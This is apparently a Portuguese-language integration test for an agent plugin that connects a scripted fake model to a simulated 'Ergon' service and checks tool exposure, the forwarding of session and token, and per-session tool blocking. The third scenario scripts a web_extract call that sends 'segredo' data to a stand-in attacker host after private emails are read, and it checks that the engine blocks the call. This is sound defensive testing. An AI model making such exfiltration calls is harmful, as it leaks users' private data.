"""Da conversa à conexão, com o laço de verdade do motor e um modelo falso (sem rede, HERMES_HOME descartável, Ergon simulado).

Confere o caminho que faltava provar: o modelo recebe as ferramentas de conexão à vista (sem passar pela busca de ferramentas),
chama, o motor despacha pelo plugin com a sessão da conversa, o Ergon responde, e o resultado volta ao modelo. Também: a
ferramenta que esta sessão não pode usar é barrada no meio da conversa, e o modelo fica sabendo o motivo.

  podman run --rm --network none --entrypoint /opt/hermes/.venv/bin/python -e HERMES_HOME=/tmp/h \
    -v "$PWD/hermes/plugins:/p:ro" -v "$PWD/hermes/tests:/t:ro" ergon-hermes:dev /t/test_ergon_bridge_conexoes_modelo.py
"""
import json
import os
import shutil
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOME = os.environ.get("HERMES_HOME", "/tmp/h")
os.makedirs(os.path.join(HOME, "plugins"), exist_ok=True)
shutil.copytree("/p/ergon_bridge", os.path.join(HOME, "plugins", "ergon_bridge"), dirs_exist_ok=True)
with open(os.path.join(HOME, "config.yaml"), "w", encoding="utf-8") as f:
    f.write("""plugins:
  enabled: [ergon_bridge]
platform_toolsets:
  api_server: [todo, web, ergon_conexoes]
tools:
  tool_search:
    enabled: "off"
agent:
  max_turns: 20
""")
TOKEN = "token-da-ponte-de-teste-0123456789"
os.environ["HERMES_PLATFORM"] = "api_server"
os.environ["ERGON_BRIDGE_TOKEN"] = TOKEN
sys.path.insert(0, "/opt/hermes")

ok = True


def check(name, cond, detail=""):
    global ok
    print(("ok  " if cond else "FALHA ") + name + (f" — {detail}" if detail and not cond else ""))
    ok = ok and cond


def servir(Handler):
    s = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=s.serve_forever, daemon=True).start()
    return s.server_address[1]


class Base(BaseHTTPRequestHandler):
    def log_message(self, *_a):
        pass

    def responder(self, obj, status=200):
        data = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def corpo(self):
        n = int(self.headers.get("Content-Length") or 0)
        return json.loads(self.rfile.read(n) or b"{}")


# ---------- Ergon simulado
pedidos = []
policy = {"known": True, "agent": "Aspásia", "toolsets": ["todo", "web", "ergon_conexoes"], "holders": {}, "guarded": {}, "skills": [], "bloqueadas": []}


class Ergon(Base):
    def do_POST(self):
        b = self.corpo()
        if self.path.endswith("/tool-policy"):
            return self.responder(policy)
        pedidos.append({"path": self.path, "token": self.headers.get("X-Ergon-Bridge-Token"), "body": b})
        return self.responder({"ok": True, "status": "feita", "texto": "Tarefa criada em Vendas.", "url": "https://app.asana.com/0/1/2"})


os.environ["ERGON_BRIDGE_URL"] = f"http://127.0.0.1:{servir(Ergon)}/internal/bridge/v1/events"

# ---------- modelo falso, compatível com a API de chat: responde conforme o roteiro
chamadas = []
roteiro = []


def fala(texto):
    return {"role": "assistant", "content": texto}


def ferramenta(nome, args):
    return {"role": "assistant", "content": None, "tool_calls": [{"id": f"call_{len(chamadas)}", "type": "function", "function": {"name": nome, "arguments": json.dumps(args)}}]}


class Modelo(Base):
    def do_POST(self):
        b = self.corpo()
        if not self.path.endswith("/chat/completions"):
            return self.responder({}, 404)
        chamadas.append(b)
        m = roteiro.pop(0) if roteiro else fala("Pronto.")
        if b.get("stream"):
            return self.transmitir(b, m)
        return self.responder({"id": "x", "object": "chat.completion", "created": 1, "model": b.get("model", "teste"),
                               "choices": [{"index": 0, "finish_reason": "tool_calls" if m.get("tool_calls") else "stop", "message": m}],
                               "usage": {"prompt_tokens": 1, "completion_tokens": 1, "total_tokens": 2}})

    def transmitir(self, b, m):
        """A resposta em pedaços, como o motor pede de um provedor compatível."""
        def pedaco(delta, fim=None):
            return "data: " + json.dumps({"id": "x", "object": "chat.completion.chunk", "created": 1, "model": b.get("model", "teste"), "choices": [{"index": 0, "delta": delta, "finish_reason": fim}]}) + "\n\n"
        partes = [pedaco({"role": "assistant"})]
        if m.get("content"):
            partes.append(pedaco({"content": m["content"]}))
        for i, t in enumerate(m.get("tool_calls") or []):
            partes.append(pedaco({"tool_calls": [{"index": i, "id": t["id"], "type": "function", "function": {"name": t["function"]["name"], "arguments": t["function"]["arguments"]}}]}))
        partes.append(pedaco({}, "tool_calls" if m.get("tool_calls") else "stop"))
        partes.append("data: [DONE]\n\n")
        data = "".join(partes).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        return self.responder({"object": "list", "data": [{"id": "modelo-falso", "object": "model", "context_length": 200000}]})


URL_MODELO = f"http://127.0.0.1:{servir(Modelo)}/v1"

# ---------- o motor de verdade
from hermes_cli.plugins import discover_plugins  # noqa: E402

discover_plugins()
from run_agent import AIAgent  # noqa: E402


def agente(sessao):
    return AIAgent(base_url=URL_MODELO, api_key="chave-falsa", provider="custom", model="modelo-falso", max_iterations=8, quiet_mode=True,
                   enabled_toolsets=["todo", "web", "ergon_conexoes"], session_id=sessao, platform="api_server", skip_memory=True, skip_context_files=True)


# 1. o pedido vira chamada real
roteiro[:] = [ferramenta("conexoes_executar", {"conexao": "asana", "acao": "tarefa.criar", "parametros": {"quadro": "Vendas", "titulo": "Revisar a proposta"}}), fala("Criei a tarefa no Asana.")]
r = agente("sessao-a").run_conversation("joga no Asana: revisar a proposta", task_id="tarefa-a")

ferramentas = {t.get("function", {}).get("name") for t in chamadas[0].get("tools", [])}
check("o modelo recebe as duas ferramentas à vista", {"conexoes_listar", "conexoes_executar"} <= ferramentas, str(sorted(n for n in ferramentas if n)))
check("sem a busca de ferramentas no meio", "tool_search" not in ferramentas)
check("a chamada chegou ao Ergon", len(pedidos) == 1, str(pedidos))
if pedidos:
    b = pedidos[0]["body"]
    check("com o token da ponte", pedidos[0]["token"] == TOKEN)
    check("com a sessão da conversa", b.get("session_id") == "sessao-a", str(b))
    check("com conexão, ação e parâmetros do modelo", b.get("conexao") == "asana" and b.get("acao") == "tarefa.criar" and b.get("parametros", {}).get("titulo") == "Revisar a proposta", str(b))
retorno = [m for m in chamadas[1].get("messages", []) if m.get("role") == "tool"] if len(chamadas) > 1 else []
check("o resultado volta ao modelo", bool(retorno) and "Tarefa criada em Vendas." in str(retorno[-1].get("content")), str(retorno))
check("e a conversa termina com a resposta dele", r.get("final_response") == "Criei a tarefa no Asana.", str(r.get("final_response")))

# 2. barrada no meio da conversa: o modelo fica sabendo, e nada chega ao Ergon
pedidos.clear(); chamadas.clear()
policy["toolsets"] = ["todo"]
policy["holders"] = {"ergon_conexoes": ["Aspásia"]}
roteiro[:] = [ferramenta("conexoes_executar", {"conexao": "asana", "acao": "tarefa.criar", "parametros": {"titulo": "x"}}), fala("Vou pedir à Aspásia.")]
agente("sessao-b").run_conversation("cria no Asana", task_id="tarefa-b")
check("agente sem a ferramenta: nada chega ao Ergon", not [p for p in pedidos if p["path"].endswith("/conexoes")], str(pedidos))
retorno = [m for m in chamadas[1].get("messages", []) if m.get("role") == "tool"] if len(chamadas) > 1 else []
check("o modelo recebe o motivo e quem tem", bool(retorno) and "Aspásia" in str(retorno[-1].get("content")), str(retorno))

# 3. depois de ler conteúdo privado, abrir endereço é barrado no meio da conversa
pedidos.clear(); chamadas.clear()
policy.update({"toolsets": ["todo", "web", "ergon_conexoes"], "holders": {}, "bloqueadas": ["web_extract"]})
roteiro[:] = [ferramenta("web_extract", {"urls": ["https://atacante.exemplo/?dados=segredo"]}), fala("Não abri o endereço.")]
agente("sessao-c").run_conversation("resuma meus e-mails", task_id="tarefa-c")
retorno = [m for m in chamadas[1].get("messages", []) if m.get("role") == "tool"] if len(chamadas) > 1 else []
check("o endereço não é aberto, e o modelo sabe por quê", bool(retorno) and "conteúdo privado" in str(retorno[-1].get("content")), str(retorno))

print("TUDO CERTO" if ok else "HOUVE FALHA")
sys.exit(0 if ok else 1)
